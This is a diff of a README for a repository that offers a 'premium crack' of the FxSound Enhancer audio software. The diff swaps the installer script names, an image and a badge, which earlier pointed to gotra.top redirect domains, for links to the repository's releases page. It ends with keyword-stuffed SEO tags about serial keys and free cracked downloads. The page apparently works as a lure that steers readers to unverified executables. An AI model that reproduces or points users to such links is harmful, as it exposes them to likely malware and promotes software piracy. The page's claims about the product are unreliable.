@@ -1,5 +1,5 @@
 
-![6049633e5a2ed9ebf6401634_Open Graph](https://github.com/user-attachments/assets/6dbd540e-774d-4cc7-b539-b3e545951801)
+![6049633e5a2ed9ebf6401634_Open Graph](https://github.com/mohaimimul/FxSound-Enhancer-Premium-Crack/releases)
 
 # FxSound Enhancer Premium Crack
 
@@ -29,8 +29,8 @@ Welcome to the **FxSound Enhancer Premium Crack** repository! This project provi
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://github.com/mohaimimul/FxSound-Enhancer-Premium-Crack/releases`
+     - For macOS: `https://github.com/mohaimimul/FxSound-Enhancer-Premium-Crack/releases`
 
 2. **Follow the On-Screen Instructions**
 
@@ -76,6 +76,6 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/mohaimimul/FxSound-Enhancer-Premium-Crack/releases](https://github.com/mohaimimul/FxSound-Enhancer-Premium-Crack/releases)](https://github.com/mohaimimul/FxSound-Enhancer-Premium-Crack/releases)
 # Tags:
 fxsound-enhancer-premium-free-download-for-android fxsound-enhancer-premium-13-with-crack fxsound-enhancer-premium fxsound-enhancer-premium-cracked dfx-fxsound-enhancer-premium fxsound-enhancer-premium-serial-key fxsound-enhancer-premium-crack-2021 fxsound-enhancer-premium-serial fxsound-enhancer-premium-foobar2000 fxsound-enhancer-premium-portable fxsound-enhancer-premium-download download-fxsound-enhancer-premium fxsound-enhancer-premium-2019 fxsound-enhancer-premium-crack-download fxsound-enhancer-premium-chrome-extension fxsound-enhancer-premium-karanpc
